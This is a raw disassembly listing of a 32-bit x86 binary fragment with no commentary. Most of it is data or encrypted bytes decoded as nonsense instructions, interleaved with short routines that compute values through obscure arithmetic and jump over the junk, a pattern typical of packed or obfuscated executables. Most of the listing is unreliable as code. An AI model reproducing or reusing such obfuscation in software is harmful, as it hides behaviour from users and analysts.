  40cacd:	xchg   ecx,eax
  40cace:	adc    eax,0x427d87d
  40cad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cad4:	clc    
  40cad5:	fcmovnbe st,st(7)
  40cad7:	xchg   edi,eax
  40cad8:	xor    BYTE PTR [eax-0x49],al
  40cadb:	fsin   
  40cadd:	clts   
  40cadf:	imul   ebx,DWORD PTR [edi+0x1b9270ba],0x5e
  40cae6:	jecxz  0x40ca81
  40cae8:	repz mov cs:0x3b9ad4c6,al
  40caef:	and    ebx,DWORD PTR [esi+0xf6b9e76]
  40caf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caf6:	js     0x40caa3
  40caf8:	pop    ds
  40caf9:	push   cs
  40cafa:	xchg   esp,eax
  40cafb:	test   DWORD PTR [edi+ebp*2+0x66141aa4],esi
  40cb02:	or     al,0x2a
  40cb04:	cmp    bl,BYTE PTR [edx-0x77]
  40cb07:	and    dl,BYTE PTR [ecx+eax*2+0x76a17dab]
  40cb0e:	pop    ss
  40cb0f:	lds    esi,FWORD PTR [ebx-0x10]
  40cb12:	ins    BYTE PTR es:[edi],dx
  40cb13:	inc    ecx
  40cb14:	test   al,0x3e
  40cb16:	cli    
  40cb17:	dec    eax
  40cb18:	enter  0xe0a2,0xb4
  40cb1c:	sti    
  40cb1d:	add    al,0x96
  40cb1f:	imul   ebx,ebx,0xffffffd1
  40cb22:	into   
  40cb23:	(bad)  
  40cb24:	and    BYTE PTR [edx+0x6479ccfb],0x3a
  40cb2b:	mov    bh,0xff
  40cb2d:	pop    esi
  40cb2e:	pop    edi
  40cb2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb30:	jmp    0x81d0a3c8
  40cb35:	sbb    BYTE PTR cs:[esi],bh
  40cb38:	data16 or bh,BYTE PTR [eax+ebx*2]
  40cb3c:	push   ss
  40cb3d:	mov    ecx,0xd099d1a0
  40cb42:	out    dx,al
  40cb43:	pop    es
  40cb44:	mov    esp,DWORD PTR [esi]
  40cb46:	cmp    eax,0x67385c96
  40cb4b:	pop    ebp
  40cb4c:	dec    ebp
  40cb4d:	sub    BYTE PTR [eax-0x66271267],al
  40cb53:	push   0x45ebb7fd
  40cb58:	retf   
  40cb59:	sbb    ebx,edi
  40cb5b:	jle    0x40cb94
  40cb5d:	(bad)  
  40cb5e:	lea    eax,[eax-0x5dd8bd00]
  40cb64:	or     eax,0xcd082b93
  40cb69:	pop    edi
  40cb6a:	jb     0x40cb34
  40cb6c:	inc    eax
  40cb6d:	out    dx,eax
  40cb6e:	fsub   st(5),st
  40cb70:	sbb    al,0x8
  40cb72:	sub    al,ah
  40cb74:	inc    eax
  40cb75:	adc    DWORD PTR [esi-0x6e5095ee],edi
  40cb7b:	aad    0xa
  40cb7d:	mov    ah,BYTE PTR [ecx-0x701bf6f2]
  40cb83:	cld    
  40cb84:	add    al,0xdd
  40cb86:	xor    ah,ch
  40cb88:	iret   
  40cb89:	mov    BYTE PTR [edi],cl
  40cb8b:	xor    DWORD PTR [ecx],ecx
  40cb8d:	cmp    ebp,ebx
  40cb8f:	arpl   WORD PTR [eax],bx
  40cb91:	aaa    
  40cb92:	xor    ebx,ebx
  40cb94:	xlat   BYTE PTR ds:[ebx]
  40cb95:	dec    esp
  40cb96:	inc    edx
  40cb97:	cmp    DWORD PTR [esi+ebp*8],edx
  40cb9a:	cld    
  40cb9b:	repz sahf 
  40cb9d:	jmp    0x8ef3:0x8c6a7280
  40cba4:	arpl   WORD PTR [ebx],di
  40cba6:	adc    ebx,DWORD PTR [ecx-0x40a77fdb]
  40cbac:	add    bl,BYTE PTR [edi-0x40]
  40cbaf:	add    BYTE PTR [edi+0x1841f28f],dh
  40cbb5:	sub    eax,esi
  40cbb7:	jmp    0x1ae69117
  40cbbc:	leave  
  40cbbd:	sahf   
  40cbbe:	sbb    eax,0x2f1b971
  40cbc3:	ds in  al,0xf3
  40cbc6:	or     edx,edi
  40cbc8:	xchg   ecx,eax
  40cbc9:	cld    
  40cbca:	popa   
  40cbcb:	mov    DWORD PTR [edx],edx
  40cbcd:	es push ss
  40cbcf:	push   DWORD PTR ds:0xb145ec03
  40cbd5:	jp     0x40cc45
  40cbd7:	sub    bh,ch
  40cbd9:	sbb    esi,ebp
  40cbdb:	cmc    
  40cbdc:	lea    ebx,[ecx-0x6a]
  40cbdf:	jae    0x40cc06
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x422640,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax+0x7c750e19],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [esi-0x532182f7],bh
  40cc7c:	pop    edx
  40cc7d:	leave  
  40cc7e:	sub    DWORD PTR [edx],0xf430ead3
  40cc84:	inc    edx
  40cc85:	mov    esi,0xe6348fc3
  40cc8a:	fnsave [esi]
  40cc8c:	lods   al,BYTE PTR ds:[esi]
  40cc8d:	cs and eax,0x4b0cf89c
  40cc93:	gs jne 0x40ccd8
  40cc96:	jmp    0x40cd0d
  40cc98:	adc    BYTE PTR [ebx],0xec
  40cc9b:	es pop ss
  40cc9d:	mov    ds:0xcbaefab5,eax
  40cca2:	add    cl,0x5
  40cca5:	push   es
  40cca6:	cmp    eax,0xd6f493f5
  40ccab:	jo     0x40cc75
  40ccad:	xchg   ebx,eax
  40ccae:	or     cl,BYTE PTR [edi]
  40ccb0:	inc    ebx
  40ccb1:	fnsave [ecx]
  40ccb3:	gs stos DWORD PTR es:[edi],eax
  40ccb5:	dec    esp
  40ccb6:	dec    edx
  40ccb7:	jmp    0xd7e65c2e
  40ccbc:	xchg   ecx,eax
  40ccbd:	mov    bh,0xa1
  40ccbf:	nop
  40ccc0:	jno    0x40cccb
  40ccc2:	jle    0x40cc5c
  40ccc4:	push   ebx
  40ccc5:	xor    BYTE PTR [esp+eax*1],0xfb
  40ccc9:	jae    0x40cd2f
  40cccb:	pop    ebp
  40cccc:	mov    edx,0x10b7c8d5
  40ccd1:	int    0x8a
  40ccd3:	mov    ebp,0xc3aace92
  40ccd8:	js     0x40cd4d
  40ccda:	xor    BYTE PTR [ebp-0x22072c45],al
  40cce0:	rcl    BYTE PTR [ebp+eax*2-0xfc579e2],0x4b
  40cce8:	popf   
  40cce9:	in     al,0x8e
  40cceb:	pop    eax
  40ccec:	repz pop ebx
  40ccee:	add    edx,ecx
  40ccf0:	xchg   ecx,eax
  40ccf1:	into   
  40ccf2:	add    DWORD PTR [ebx+0x4c411ca1],0x7a430d69
  40ccfc:	push   ds
  40ccfd:	ret    
  40ccfe:	popa   
  40ccff:	int3   
  40cd00:	nop
  40cd01:	jo     0x40cc8b
  40cd03:	push   esi
  40cd04:	push   cs
  40cd05:	inc    esi
  40cd06:	fiadd  DWORD PTR [edx+ecx*4]
  40cd09:	jecxz  0x40cca5
  40cd0b:	lahf   
  40cd0c:	stos   BYTE PTR es:[edi],al
  40cd0d:	ds pushf 
  40cd0f:	xchg   DWORD PTR [eax-0x39],edi
  40cd12:	push   ss
  40cd13:	mov    dh,0xc6
  40cd15:	inc    esp
  40cd16:	jbe    0x40cce6
  40cd18:	aam    0xa8
  40cd1a:	fs or  edi,0xffffff9c
  40cd1e:	cld    
  40cd1f:	add    eax,0xfc59f9af
  40cd24:	jo     0x40cd19
  40cd26:	jecxz  0x40ccd3
  40cd28:	sub    eax,0xd7c9cfa4
  40cd2d:	inc    edi
  40cd2e:	xor    al,0x9f
  40cd30:	inc    edx
  40cd31:	push   ebx
  40cd32:	dec    ebx
  40cd33:	inc    ebx
  40cd34:	into   
  40cd35:	dec    ebx
  40cd36:	cld    
  40cd37:	(bad)  
  40cd38:	loopne 0x40ccbd
  40cd3a:	xor    BYTE PTR [eax],bh
  40cd3c:	dec    eax
  40cd3d:	bound  esp,QWORD PTR [esp+esi*2+0x6]
  40cd41:	xor    al,0xa0
  40cd43:	sub    al,dh
  40cd45:	adc    edx,0x3ec34ff9
  40cd4b:	mov    al,es:0x6b78e890
  40cd51:	es dec ecx
  40cd53:	xchg   ecx,edx
  40cd55:	idiv   edx
  40cd57:	repz mov esi,0xfbf56f48
  40cd5d:	loope  0x40cda9
  40cd5f:	push   edx
  40cd60:	data16 cmc 
  40cd62:	mov    bh,0xd5
  40cd64:	mov    ecx,0xe0ac640d
  40cd69:	retf   
  40cd6a:	mov    bh,BYTE PTR [edi]
  40cd6c:	sbb    DWORD PTR [ebx],esi
  40cd6e:	fild   DWORD PTR [ebp+0x13664349]
  40cd74:	and    DWORD PTR [eax-0x3a],ebx
  40cd77:	retf   
  40cd78:	or     ebp,esp
  40cd7a:	std    
  40cd7b:	mov    es,WORD PTR [edi]
  40cd7d:	cdq    
  40cd7e:	add    BYTE PTR [ebx+ecx*8+0x1c],0x57
  40cd83:	inc    cl
  40cd85:	retf   
  40cd86:	pop    ecx
  40cd87:	retf   
  40cd88:	pop    eax
  40cd89:	(bad)  
  40cd8a:	popa   
  40cd8b:	test   DWORD PTR [ecx],0x40c113f1
  40cd91:	aaa    
  40cd92:	mov    WORD PTR [ecx],es
  40cd94:	add    BYTE PTR [ecx-0x3fb8b772],0x5e
  40cd9b:	add    BYTE PTR [ecx],0xb5
  40cd9e:	dec    ebx
  40cd9f:	mov    dh,0xc4
  40cda1:	dec    eax
  40cda2:	and    eax,0x24ee203a
  40cda7:	add    al,0x8
  40cda9:	xor    eax,0xcbbf89f2
  40cdae:	cdq    
  40cdaf:	(bad)  
  40cdb0:	neg    DWORD PTR [edx+ebx*1+0x43]
  40cdb4:	aam    0xa
  40cdb6:	lock jmp 0x95c4b98
  40cdbc:	cs cmp bl,ch
  40cdbf:	test   eax,0x1658bf78
  40cdc4:	fimul  DWORD PTR [ebp+0x21c1ecbc]
  40cdca:	repnz mov esi,DWORD PTR [edi]
  40cdcd:	add    BYTE PTR [edi-0x7d],cl
  40cdd0:	jmp    0x40ce41
  40cdd2:	adc    DWORD PTR [ecx+0x3e69b3bb],edx
  40cdd8:	sbb    esp,DWORD PTR [edi-0x68]
  40cddb:	push   0xffffff92
  40cddd:	sub    al,0x6d
  40cddf:	pop    edx
  40cde0:	mov    esp,0x5037c9f2
  40cde5:	mov    dl,0x65
  40cde7:	retf   
  40cde8:	mov    BYTE PTR [eax+esi*1],dl
  40cdeb:	inc    ebx
  40cdec:	std    
  40cded:	out    dx,al
  40cdee:	sub    eax,0xf8157b79
  40cdf3:	fwait
  40cdf4:	outs   dx,BYTE PTR ds:[esi]
  40cdf5:	push   esi
  40cdf6:	push   edx
  40cdf7:	xchg   ebx,eax
  40cdf8:	cvtps2pd xmm4,xmm6
  40cdfb:	or     edx,eax
  40cdfd:	inc    eax
  40cdfe:	int3   
  40cdff:	mov    dl,0x46
  40ce01:	loopne 0x40ce74
  40ce03:	dec    edx
  40ce04:	in     eax,dx
  40ce05:	call   0x74737cc6
  40ce0a:	and    BYTE PTR [ebx],bh
  40ce0c:	nop
  40ce0d:	lds    edi,FWORD PTR [ebx+0x50]
  40ce10:	mov    esp,0x35901083
  40ce15:	mov    cl,0xd5
  40ce17:	call   0x7b12:0xb236fc9e
  40ce1e:	and    al,bl
  40ce20:	mov    ebx,0xa430f285
  40ce25:	mov    ebx,0x1fef00d1
  40ce2a:	repnz inc ebp
  40ce2c:	arpl   ax,si
  40ce2e:	add    esi,ecx
  40ce30:	call   edx
  40ce32:	fdiv   st(0),st
  40ce34:	sbb    al,BYTE PTR [ebx+eiz*8]
  40ce37:	imul   ebx,esi,0x9686d70f
  40ce3d:	int3   
  40ce3e:	cld    
  40ce3f:	cs push cs
  40ce41:	in     al,dx
  40ce42:	xchg   ecx,eax
  40ce43:	icebp  
  40ce44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce45:	adc    eax,0xcde2c7fc
  40ce4a:	inc    BYTE PTR [ecx+0x3b13fae9]
  40ce50:	push   eax
  40ce51:	mov    cl,0xb2
  40ce53:	jle    0x40ceaa
  40ce55:	test   eax,0xd2953abe
  40ce5a:	cmc    
  40ce5b:	jmp    0x40cde7
  40ce5d:	aas    
  40ce5e:	(bad)
  40ce61:	add    dh,cl
  40ce63:	pop    ss
  40ce64:	retf   
  40ce65:	dec    esp
  40ce66:	cmp    eax,0x8d9463dd
  40ce6b:	sbb    al,0x4
  40ce6d:	or     ebp,0x59b76676
  40ce73:	ins    DWORD PTR es:[edi],dx
  40ce74:	lock xchg DWORD PTR [ecx-0x2b],eax
  40ce78:	adc    DWORD PTR [ecx+0x5176042a],0x10
  40ce7f:	dec    ecx
  40ce80:	sub    DWORD PTR [ebx-0x26],esp
  40ce83:	(bad)  
  40ce84:	pop    eax
  40ce85:	outs   dx,BYTE PTR ds:[esi]
  40ce86:	mov    ds:0x9b3e7392,eax
  40ce8b:	pop    ebp
  40ce8c:	adc    edi,DWORD PTR [eax-0x4ad698db]
  40ce92:	repnz xor BYTE PTR [ebp-0x80],bl
  40ce96:	push   ss
  40ce97:	sar    cl,1
  40ce99:	in     eax,dx
  40ce9a:	push   ds
  40ce9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce9c:	jge    0x40ced2
  40ce9e:	pop    ds
  40ce9f:	popf   
  40cea0:	fwait
  40cea1:	add    DWORD PTR [edx+0x1aef0ed],esp
  40cea7:	iret   
  40cea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cea9:	adc    al,0x68
  40ceab:	mov    ebp,es
  40cead:	dec    ecx
  40ceae:	lahf   
  40ceaf:	push   ss
  40ceb0:	dec    ecx
  40ceb1:	icebp  
  40ceb2:	sub    esp,DWORD PTR [edx]
  40ceb4:	sbb    eax,0x5932d7a6
  40ceb9:	add    ebx,DWORD PTR [edx-0x44]
  40cebc:	mov    edx,0xdc940165
  40cec1:	and    DWORD PTR [ebp+edx*8+0x4968a2ea],ecx
  40cec8:	inc    esp
  40cec9:	in     eax,dx
  40ceca:	adc    DWORD PTR [ecx+0x2b],edi
  40cecd:	jo     0x40ce8c
  40cecf:	pushf  
  40ced0:	je     0x40ce8d
  40ced2:	int3   
  40ced3:	sbb    dh,BYTE PTR [edi+edi*1+0x5c]
  40ced7:	push   eax
  40ced8:	fs retf 0x156e
  40cedc:	rcl    BYTE PTR [esi+0x3c],0xdc
  40cee0:	mov    ch,0x62
  40cee2:	sub    eax,0x3424123e
  40cee7:	jmp    0x40ced7
  40cee9:	out    0xf5,al
  40ceeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceec:	lea    esp,[ecx]
  40ceee:	cli    
  40ceef:	bound  edi,QWORD PTR [eax+0x7dcbdd1]
  40cef5:	int    0x5f
  40cef7:	sbb    edi,eax
  40cef9:	xlat   BYTE PTR ds:[ebx]
  40cefa:	jle    0x40cf0a
  40cefc:	cld    
  40cefd:	jns    0x40ce90
  40ceff:	sbb    DWORD PTR [ebx+0x16],0x20
  40cf03:	imul   esi,DWORD PTR [ebx+0x42],0xffffffb7
  40cf07:	sub    BYTE PTR [bp+si],cl
  40cf0a:	xchg   ecx,eax
  40cf0b:	dec    edx
  40cf0c:	mov    ebp,0xf9c7a941
  40cf11:	ja     0x40cf4d
  40cf13:	scas   eax,DWORD PTR es:[edi]
  40cf14:	stos   DWORD PTR es:[edi],eax
  40cf15:	mov    ds:0x7c7fec6c,al
  40cf1a:	mov    ebx,0x8b97dcc0
  40cf1f:	inc    ebp
  40cf20:	cld    
  40cf21:	sub    ecx,eax
  40cf23:	add    ecx,DWORD PTR [ebp-0xc]
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422538
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi+0x9c9bcd3],esi
  40cfad:	xchg   ebx,eax
  40cfae:	mov    esp,0x1818e872
  40cfb3:	rcl    BYTE PTR [eax+ebx*1],cl
  40cfb6:	sbb    BYTE PTR [eax],al
  40cfb8:	pushf  
  40cfb9:	or     bh,bl
  40cfbb:	retf   0x8d26
  40cfbe:	push   edi
  40cfbf:	enter  0x61,0xb9
  40cfc3:	std    
  40cfc4:	rol    BYTE PTR [esi],0x56
  40cfc7:	sti    
  40cfc8:	or     edi,DWORD PTR [edx]
  40cfca:	jb     0x40cfda
  40cfcc:	pop    ecx
  40cfcd:	nop
  40cfce:	add    al,0x84
  40cfd0:	sbb    bl,dh
  40cfd2:	mov    edi,DWORD PTR [edi]
  40cfd4:	add    edx,edi
  40cfd6:	cmp    BYTE PTR [ecx+0x7cda69f1],dl
  40cfdc:	xchg   esp,eax
  40cfdd:	fsubr  DWORD PTR [edi]
  40cfdf:	imul   ebx,DWORD PTR [edx-0x1790c92a],0xf601f694
  40cfe9:	addr16 jb 0x40cf89
  40cfec:	jmp    DWORD PTR [ebp-0x8]
  40cfef:	setne  BYTE PTR es:[ebx+0x0]
  40cff4:	ror    DWORD PTR [esi-0x2a6e7e66],0x2a
  40cffb:	fs out dx,al
  40cffd:	mov    edi,DWORD PTR ds:0x22101c59
  40d003:	mov    bh,0xe4
  40d005:	pop    ss
  40d006:	sbb    al,0xc7
  40d008:	xchg   ebx,eax
  40d009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d00a:	imul   esp,DWORD PTR [edi-0x23],0x3ad6e42c
  40d011:	scas   al,BYTE PTR es:[edi]
  40d012:	lahf   
  40d013:	(bad)  
  40d016:	pusha  
  40d017:	or     eax,0xa2f73458
  40d01c:	sbb    esi,DWORD PTR [edx-0xf]
  40d01f:	fsub   st(7),st
  40d021:	or     al,0x3f
  40d023:	outs   dx,DWORD PTR ds:[esi]
  40d024:	sub    al,0x25
  40d026:	pop    edx
  40d027:	rcl    BYTE PTR [bp+di+0x5c46],cl
  40d02c:	xchg   DWORD PTR ss:[edi],edi
  40d02f:	inc    esp
  40d030:	sbb    eax,0x18db5ac4
  40d035:	stc    
  40d036:	pop    ebp
  40d037:	push   ebx
  40d038:	sar    edx,0xd4
  40d03b:	sub    BYTE PTR [esi+ebx*4-0x5e],0xae
  40d040:	push   0xffffffd8
  40d042:	push   edx
  40d043:	xor    BYTE PTR [esi+ebp*4],ah
  40d046:	ins    DWORD PTR es:[edi],dx
  40d047:	push   esp
  40d048:	jl     0x40d09e
  40d04a:	xchg   ebx,eax
  40d04b:	repz inc ecx
  40d04d:	(bad)  
  40d04e:	mov    WORD PTR [ebx-0x369e4a36],ss
  40d054:	scas   eax,DWORD PTR es:[edi]
  40d055:	adc    ebx,ecx
  40d057:	nop
  40d058:	pop    edi
  40d059:	pop    esp
  40d05a:	fsubr  QWORD PTR [edi+edx*8+0x38db69e6]
  40d061:	jne    0x40d0c0
  40d063:	inc    ebp
  40d064:	cli    
  40d065:	push   eax
  40d066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d067:	dec    eax
  40d068:	pop    ebx
  40d069:	pop    esi
  40d06a:	out    dx,al
  40d06b:	mov    cl,0x5e
  40d06d:	call   0xe92a:0x450968d3
  40d074:	sbb    al,0xd9
  40d076:	jl     0x40d0aa
  40d078:	fmul   QWORD PTR [edx]
  40d07a:	ds mov bh,0xf4
  40d07d:	fsub   st(2),st
  40d07f:	xchg   ebp,eax
  40d080:	enter  0x440c,0xf
  40d084:	daa    
  40d085:	std    
  40d086:	mov    ch,0x5
  40d088:	pop    ecx
  40d089:	sahf   
  40d08a:	mov    ds:0x391e216b,eax
  40d08f:	loope  0x40d046
  40d091:	jno    0x40d074
  40d093:	pop    esp
  40d094:	test   eax,0x2414bb7c
  40d099:	out    dx,eax
  40d09a:	ja     0x40d047
  40d09c:	xchg   BYTE PTR [edi],ch
  40d09e:	(bad)  
  40d09f:	ins    DWORD PTR es:[edi],dx
  40d0a0:	ins    BYTE PTR es:[edi],dx
  40d0a1:	iret   
  40d0a2:	jns    0x40d110
  40d0a4:	fld    st(1)
  40d0a6:	jl     0x40d0b2
  40d0a8:	inc    ecx
  40d0a9:	add    ebx,esi
  40d0ab:	retf   
  40d0ac:	or     cl,dh
  40d0ae:	xor    eax,0x48021fbd
  40d0b3:	dec    ecx
  40d0b4:	inc    edx
  40d0b5:	or     eax,0xdee6dafc
  40d0ba:	pop    ecx
  40d0bb:	ret    
  40d0bc:	inc    edx
  40d0bd:	mov    ds:0x2043cb20,al
  40d0c2:	addr16 nop
  40d0c4:	or     al,al
  40d0c6:	loop   0x40d0ca
  40d0c8:	push   ebx
  40d0c9:	lods   eax,DWORD PTR ds:[esi]
  40d0ca:	mov    dh,0x20
  40d0cc:	push   es
  40d0cd:	jmp    0xcf4455b6
  40d0d2:	pop    ebp
  40d0d3:	push   es
  40d0d4:	les    ecx,FWORD PTR [edx]
  40d0d6:	stos   DWORD PTR es:[edi],eax
  40d0d7:	xor    DWORD PTR fs:[esi+0x1ceb303],esp
  40d0de:	out    0xc4,eax
  40d0e0:	loopne 0x40d113
  40d0e2:	int3   
  40d0e3:	xchg   ebx,eax
  40d0e4:	mov    al,ds:0xc689219d
  40d0e9:	pushf  
  40d0ea:	sub    eax,0x8130535d
  40d0ef:	aaa    
  40d0f0:	push   eax
  40d0f1:	add    eax,0x1b445215
  40d0f6:	push   esi
  40d0f7:	xchg   edx,eax
  40d0f8:	test   ebp,0x35e48d95
  40d0fe:	dec    ebp
  40d0ff:	add    al,0x3a
  40d101:	ja     0x40d0a5
  40d103:	fsubr  DWORD PTR [ecx+0x58]
  40d106:	jnp    0x40d16d
  40d108:	btr    DWORD PTR [edi-0x705c4d24],0xfa
  40d110:	push   ecx
  40d111:	sahf   
  40d112:	mov    dh,0x1a
  40d114:	retf   
  40d115:	scas   eax,DWORD PTR es:[edi]
  40d116:	mov    dl,0xa8
  40d118:	adc    dh,BYTE PTR [eax-0xf]
  40d11b:	fstp   DWORD PTR [ebx]
  40d11d:	loope  0x40d0db
  40d11f:	leave  
  40d120:	xor    cl,0x5b
  40d123:	jb     0x40d0ac
  40d125:	mov    ds:0xd86a5251,al
  40d12a:	call   0xcaca:0x5e630a8d
  40d131:	mov    bh,0x59
  40d133:	pop    es
  40d134:	out    dx,eax
  40d135:	xchg   esp,eax
  40d136:	(bad)  
  40d137:	(bad)  
  40d138:	rcr    cl,0x42
  40d13b:	jle    0x40d150
  40d13d:	aaa    
  40d13e:	pushf  
  40d13f:	sub    DWORD PTR [edx-0x7],0xeacb4fd8
  40d146:	not    BYTE PTR [ebx+0x24]
  40d149:	(bad)  
  40d14a:	ins    BYTE PTR es:[edi],dx
  40d14b:	adc    bl,cl
  40d14d:	pop    esi
  40d14e:	gs mov dl,0xd0
  40d151:	mov    edi,0x42dd897f
  40d156:	idiv   DWORD PTR [ebx]
  40d158:	xchg   DWORD PTR [ebp+0x7],edx
  40d15b:	mov    WORD PTR [ecx],ss
  40d15d:	inc    ebp
  40d15e:	jae    0x40d0f1
  40d160:	jno    0x40d140
  40d162:	adc    DWORD PTR [eax+0x76],ebx
  40d165:	xchg   edi,eax
  40d166:	sub    al,BYTE PTR [esi+0x2c1479c4]
  40d16c:	and    DWORD PTR [esi+ebx*8],edi
  40d16f:	(bad)  
  40d170:	jmp    0xf09bfcaf
  40d175:	aas    
  40d176:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d177:	adc    BYTE PTR [edi-0x6fbf2e86],al
  40d17d:	pop    ss
  40d17e:	dec    ebx
  40d17f:	xlat   BYTE PTR ds:[ebx]
  40d180:	retf   
  40d181:	pusha  
  40d182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d183:	test   edx,edi
  40d185:	scas   eax,DWORD PTR es:[edi]
  40d186:	fiadd  DWORD PTR [eax]
  40d188:	scas   al,BYTE PTR es:[edi]
  40d189:	ss xcrypt-ofb (bad)
  40d18b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d18c:	scas   al,BYTE PTR es:[edi]
  40d18d:	mov    eax,ds:0x3f6535bb
  40d192:	adc    DWORD PTR [ebx],edx
  40d194:	add    DWORD PTR [edi-0x1e],edx
  40d197:	pop    ds
  40d198:	push   es
  40d199:	mov    ss,WORD PTR [esi]
  40d19b:	fadd   QWORD PTR [esi]
  40d19d:	imul   ebx,DWORD PTR [ebx-0x48],0x19
  40d1a1:	fisubr WORD PTR [esi-0x2c10cfd9]
  40d1a7:	out    dx,eax
  40d1a8:	adc    cl,BYTE PTR [edi]
  40d1aa:	nop
  40d1ab:	pushf  
  40d1ac:	pop    esp
  40d1ad:	xor    esp,DWORD PTR [edi-0x69373325]
  40d1b3:	js     0x40d13d
  40d1b5:	je     0x40d198
  40d1b7:	dec    ebx
  40d1b8:	xor    ecx,DWORD PTR ds:0x102d2ca5
  40d1be:	push   ebp
  40d1bf:	(bad)  
  40d1c0:	lods   al,BYTE PTR ds:[esi]
  40d1c1:	rol    BYTE PTR [esi],1
  40d1c3:	jmp    0x2db3:0xa8a64b15
  40d1ca:	inc    edx
  40d1cb:	mov    al,0xac
  40d1cd:	inc    ebx
  40d1cf:	adc    BYTE PTR [esi],0x52
  40d1d2:	(bad)  
  40d1d3:	or     DWORD PTR [edx+0x4a],esi
  40d1d6:	sub    BYTE PTR [edx+0x30],0xd6
  40d1da:	xchg   BYTE PTR [edi+0x741fb88a],ch
  40d1e0:	loop   0x40d16c
  40d1e2:	mov    ebx,0x149fd0dc
  40d1e7:	pop    ecx
  40d1e8:	and    edx,DWORD PTR [esi-0x5ad9ea78]
  40d1ee:	(bad)  
  40d1ef:	stc    
  40d1f0:	inc    ebx
  40d1f1:	cmp    al,0x18
  40d1f3:	dec    ecx
  40d1f4:	xor    eax,0x23cdd850
  40d1f9:	lahf   
  40d1fa:	pushw  es
  40d1fc:	sub    dl,ah
  40d1fe:	xor    DWORD PTR [eax+0x25],0xcb0b3429
  40d205:	mov    ebp,0x8af97ef
  40d20a:	mov    ?,WORD PTR [ecx]
  40d20c:	jbe    0x40d1d6
  40d20e:	loop   0x40d196
  40d210:	call   0x2ec6:0xc2fa0222
  40d217:	cmc    
  40d218:	pop    edi
  40d219:	dec    esp
  40d21a:	push   esi
  40d21b:	outs   dx,BYTE PTR ds:[esi]
  40d21c:	inc    eax
  40d21d:	pushf  
  40d21e:	push   ecx
  40d21f:	out    0xe4,al
  40d221:	push   edx
  40d222:	sub    ebx,DWORD PTR [ecx+esi*1]
  40d225:	inc    ecx
  40d226:	push   eax
  40d227:	or     bh,BYTE PTR [esi-0x468753d0]
  40d22d:	es ret 0xb722
  40d231:	mov    dh,0xa7
  40d233:	or     al,0xa5
  40d235:	cmp    al,0xdd
  40d237:	xchg   ecx,eax
  40d238:	out    0xa3,al
  40d23a:	or     ecx,ebx
  40d23c:	adc    DWORD PTR [edi-0x2b767057],ebp
  40d242:	xchg   esp,esi
  40d244:	sbb    BYTE PTR [eax-0x38],bl
  40d247:	adc    eax,0x502df729
